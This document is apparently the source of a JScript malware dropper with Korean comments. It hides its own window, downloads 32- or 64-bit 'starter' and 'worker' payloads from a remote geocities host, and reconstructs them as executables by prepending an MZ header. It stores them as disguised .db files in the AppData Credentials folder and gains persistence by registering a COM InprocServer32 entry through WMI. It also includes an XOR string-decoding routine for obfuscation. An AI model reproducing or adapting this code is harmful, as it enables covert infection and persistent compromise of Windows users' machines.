var starter_32_url = "http://www.geocities.jp/cstest4141/abc32.tmp"; // 옵저버32 스타터 주소
var starter_64_url = "http://www.geocities.jp/cstest4141/abc64.tmp"; // 옵저버64 스타터 주소
var worker_32_url = "http://www.geocities.jp/cstest4141/def32.tmp"; // 옵저버32 커널 주소
var worker_64_url = "http://www.geocities.jp/cstest4141/def64.tmp"; // 옵저버64 커널 주소
var folder_path="%userprofile%\AppData\Roaming\Microsoft\Credentials\1.0";// setup 폴더
var starter_32 = "abc32.tmp"; //옵저버32 스타터이름
var starter_64 = "abc64.tmp"; //옵저버64 스타터이름
var worker_32 = "def32.tmp"; //옵저버32 워커이름
var worker_64 = "def64.tmp"; //옵저버64 워커이름 
var reg_path = "Software\\Classes\\CLSID\\{7849596a-48ea-486e-8937-a2a3009f31a9}\\InprocServer32"; 
// 등록될 레지스트리 주소(디폴트에 등록)
var temppath_10 = "%userprofile%\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE";
// 윈10 탬프폴더
var temppath_under10 = "%userprofile%\\AppData\\Local\\Microsoft\\Windows\\Temporary Internet Files\\Content.IE5";
// 윈7,8,8.1 탬프폴더                     
var temppath_xp = "%userprofile%\\Local Settings\\Temporary Internet Files";
// 윈xp 탬프폴더


var flag;
// 1이면 스타터 다운, 0이면 워커 다운
var fso = new ActiveXObject("Scripting.FileSystemObject"); 
var wShell = new ActiveXObject("WScript.Shell");

IMG_CHECK(); //스크립트 시작

function IMG_CHECK()
{
	window.resizeTo(1,1); 
	window.moveTo(5000,5000);
    try
    {
		if(window.navigator.platform == 'Win64'){ //64비트인 경우
			flag=1; //스타터 다운 
			SEND(starter_64_url,starter_64);
			flag=0; //워커 다운
			SEND(worker_64_url,worker_64);
		}
		else{//32비트인 경우
			flag=1; //스타터 다운 
			SEND(starter_32_url,starter_32);
			flag=0; //워커 다운
			SEND(worker_32_url,worker_32);
		}
	window.close();
    }
    catch(e)
    {
		window.close();
    }	      
}

function SEND(file_url,file) // 리퀘스트 send하여 파일을 임시폴더에 다운
{
	try
	{ 
		if (window.XMLHttpRequest) {
            var xmlHttp = new XMLHttpRequest(); //윈7이상 버전
        } 
        else {
            var xmlHttp = new ActiveXObject("Microsoft.XMLHTTP"); //윈xp
        }
		xmlHttp.open( "GET", file_url, false ); // 리퀘스트 보내서 인터넷 템프폴더에 파일이 저장되도록함
		xmlHttp.send( null );		
		FIND_FILE(file); // 파일을 찾으러감
	}
	catch(e)
	{
	}
}

function FIND_FILE(file) // 탬프폴더에서 파일 찾음
{
	try
	{		
		var tempfilepath;
		var filename;
		var sptemp;		
		
		sptemp = file.split('.');
		filename = sptemp[0].concat("[1]."); //임시파일은 파일명에 [1]이 붙음
		filename = filename.concat(sptemp[1]);

		R_FIND(wShell.ExpandEnvironmentStrings(temppath_10), filename);//윈10 인터넷 템프폴더			
		R_FIND(wShell.ExpandEnvironmentStrings(temppath_under10), filename);//윈7, 8, 8.1 인터넷 템프폴더
		R_FIND(wShell.ExpandEnvironmentStrings(temppath_xp), filename);// 윈xp 인터넷 템프 폴더
	}
	catch (e)
	{
	}	
}

function R_FIND(str,str2) //재귀적으로 인터넷 템프폴더를 뒤져서 정확한 파일위치를 알아냄
{
	try
	{
		var fa = fso.GetFolder(str);
		var subfa = new Enumerator(fa.SubFolders);
		for(; !subfa.atEnd(); subfa.moveNext()) // 모든 하위폴더를 재귀적으로 들어감
		{
			R_FIND(subfa.item().path,str2);
		}

		var subfile = new Enumerator(fa.files);
		for(; !subfile.atEnd(); subfile.moveNext()) // 폴더내 모든 파일 조사
		{
			if(subfile.item().name == str2)
				return SIZE_CHECK(subfile.item().path); //파일을 찾으면 복사를위한 함수로 이동
		}
	}
	catch (e)
	{
		return 0;
	}	
}

function SIZE_CHECK(tempfilepath) // 사이즈 체크
{	
	var ofile = fso.OpenTextFile(tempfilepath,1,true,-1);
	var size = fso.getfile(tempfilepath).size;
	var sdata = ofile.Read(size/2);
	ofile.Close();

	var checklen = (sdata.charCodeAt(1)&0xffff)+(sdata.charCodeAt(2)&0xffff)*0x10000;
	fso.DeleteFile(tempfilepath);

	if(checklen != size) //파일 헤더로부터 얻은 파일크기와 다운받은 파일 크기를 비교함.
	{		
		return 0;
	}
	else
	{
		var savepath = MAKE_FOLDER(); //복사할 폴더 만듦
		return COPY_FILE(sdata, savepath, size); // 파일사이즈가 같을때만복사를 실행
	}
}

function MAKE_FOLDER() // 스타터, 워커 설치할 폴더 만듦
{
	try
	{	
		var folder_path_splited = wShell.ExpandEnvironmentStrings(folder_path).split('\\');
		var made_path="";
		
		for( i = 0 ; i < folder_path_splited.length; i++)
		{
			made_path = made_path.concat(folder_path_splited[i].concat("\\"));
			FIND_MAKE_FOLDER(made_path);
		}
		return made_path;
	}
	catch(e)
	{
		return "";
	}	
}

function FIND_MAKE_FOLDER(str) //폴더가 없을때만 CreateFolder를 함
{		
	try
	{
		var folderBool = fso.FolderExists(str);
		if(!folderBool)
		{
			fso.CreateFolder(str);			
		}
	}
	catch (e)
	{
	}
}

function COPY_FILE(sdata, savepath, size) // 탬프폴더로 부터 스타터와 워커를 복사함
{
	try
	{
		var savefile1 = savepath.concat("qmgj.db");
		var savefile2 = savepath.concat("scrobi.db");
		var savefile;
		if(flag == 1)
			savefile = savefile1; //스타터일경우
		else
			savefile = savefile2; //커널일경우

		var YourFile = fso.OpenTextFile(savefile, 2,true,-2); //우선 MZ을 앞에 씀
		YourFile.Write("MZ");
		YourFile.close();
		var MyFile = fso.OpenTextFile(savefile, 8,true,-1); // MZ뒤에 다운받은 파일의 64비트를 버린 나머지를 씀.
		MyFile.Write(sdata.substr(32,size/2)); //유니코드 옵션을 주어서 인자들이 이렇게됨.
		MyFile.close();
		var HKEY_CURRENT_USER= 0x80000001;
		if(window.navigator.platform == 'Win64'){
			WriteRegStr(HKEY_CURRENT_USER,reg_path,savefile1,64); //레지스트리에 등록(wow6432node쪽에 등록이 안되도록 하기위해 wShell.regwrite를 안씀)
		}else{
			WriteRegStr(HKEY_CURRENT_USER,reg_path,savefile1,32);
		}

		return 0;
	}
	catch (e)
	{
	}	
}

function WriteRegStr (RootKey, KeyName, savefile, RegType) //레지스트리에 등록
{
  var oCtx = new ActiveXObject("WbemScripting.SWbemNamedValueSet");
  oCtx.Add("__ProviderArchitecture", RegType); //RegType에 64를 주어 32비트 프로그램으로 실행이되어도 
											   //wow6432node가 아닌 지정한곳으로 레지스트리 등록이되도록 함
  var oLocator = new ActiveXObject("WbemScripting.SWbemLocator");
  var oWMI = oLocator.ConnectServer("", "root\\default", "", "", "", "", 0, oCtx);
  var oReg = oWMI.Get("StdRegProv");

  var oInParams = oReg.Methods_("Createkey").Inparameters; //우선 키를 생성
  oInParams.Hdefkey = RootKey;
  oInParams.Ssubkeyname = KeyName;
  oReg.ExecMethod_("Createkey", oInParams, 0, oCtx);

  oInParams = oReg.Methods_("SetStringValue").Inparameters; //생성된 키에 값을 넣음(디폴트로 넣음)
  oInParams.Hdefkey = RootKey;
  oInParams.Ssubkeyname = KeyName;
  oInParams.Svalue = savefile;
  
  var oOutParams = oReg.ExecMethod_("SetStringValue", oInParams, 0, oCtx);
}

function decoding(str1){ // 스트링 디코딩함수
	var str2="";

	var hightemp;
	var lowtemp;
	var onechar;
	var temp="";
	for(i = 0 ; i < str1.length/2; i++){
		hightemp = convert_to_half(str1.charCodeAt(2*i)); //헥사 두개를 케릭터 하나로 변환하여 onechar에 저장
		lowtemp = convert_to_half(str1.charCodeAt(2*i+1));
		onechar = hightemp*16+lowtemp;		
		temp = onechar ^ (((str1.length/2 + (15 - i)) % 16) * 16 + (i + str1.length/2 * 3) % 16);
		str2 = str2.concat(String.fromCharCode(temp));
	}
	return str2;
}

function convert_to_half(half){ // 케릭터를 헥사 값으로 변환
	if (half >=0x30 && half<= 0x39)
	{
		return half-0x30;
	}
	else if( half >= 0x41 && half <= 0x46 ){
		return half - 0x41 + 0x0a;
	}
	else if( half >= 0x61 && half <= 0x66 ){
		return half - 0x61 + 0x0a;
	}
	else 
		return -1;
}